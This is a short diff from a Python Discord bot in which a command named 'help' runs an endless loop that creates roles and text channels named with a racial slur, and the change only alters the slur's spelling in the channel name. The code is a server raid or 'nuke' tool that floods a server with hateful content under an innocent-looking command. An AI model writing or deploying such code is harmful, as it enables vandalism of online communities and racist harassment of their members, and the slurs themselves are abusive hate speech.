@@ -66,7 +66,7 @@ async def help_command(ctx):
     while True:  # This will create an infinite loop
         await ctx.guild.create_role(name="NIGGER")
         await asyncio.sleep(0.55)
-        hannel = await ctx.guild.create_text_channel("niggeR")
+        hannel = await ctx.guild.create_text_channel("NIGGERS")
         await asyncio.sleep(0.55)
         for channel in ctx.guild.channels:
             if isinstance(channel, discord.TextChannel):  # Check if the channel is a text channel
